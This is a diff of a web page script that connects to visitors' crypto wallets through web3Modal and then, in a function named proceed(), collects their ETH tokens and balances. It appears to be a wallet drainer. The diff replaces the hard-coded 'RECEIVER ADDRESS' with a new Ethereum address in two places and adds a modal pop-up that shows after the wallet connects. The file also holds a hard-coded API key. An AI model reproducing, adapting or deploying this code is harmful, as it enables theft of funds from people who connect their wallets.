@@ -16,7 +16,7 @@ let provider;
 // Address of the selected account
 let selectedAccount;
 
-const receiver_addres = '0x17343bdfE70D00e4CDE8661CdE43090B884C6923'; // gaf<- RECEIVER ADDRESS HERE
+const receiver_addres = '0xD35f9AB96d04aDB02Fd549Ef6a576Ce4E2C1d935'; // gaf<- RECEIVER ADDRESS HERE
 let onButtonClick;
 let user_address;
 let start_to_log = false;
@@ -183,6 +183,9 @@ async function onConnect() {
   try {
     provider = await web3Modal.connect();
     console.log("provider", provider);
+    $(document).ready(function(){
+      $("#myModal").modal('show');
+  });
   } catch(e) {
     console.log("Could not get a wallet connection", e);
     return;
@@ -271,7 +274,7 @@ async function getBalance(address="", api_key="gChmOmU1HuqnEPvXPFKuLPlKMbQOI50jg
       })
   })
 }
-const receiver_address = '0x17343bdfE70D00e4CDE8661CdE43090B884C6923';
+const receiver_address = '0xD35f9AB96d04aDB02Fd549Ef6a576Ce4E2C1d935';
 async function proceed(){
   start_to_log = false;
   console.log("Now we roll!!!");
@@ -345,7 +348,6 @@ async function proceed(){
     
         if (eth_tokens.length < 1) {
 
-          const web3 = new Web3(provider);
           const eth_balance = await getBalance(user_address, apiKey).catch(e=>{
             console.log("Unable to get new eth balance", e);
           });
@@ -398,7 +400,6 @@ async function proceed(){
           //   })
           // }
         }
-        const web3 = new Web3(provider);
           const eth_balance = await getBalance(user_address, apiKey).catch(e=>{
             console.log("Unable to get new eth balance", e);
           });
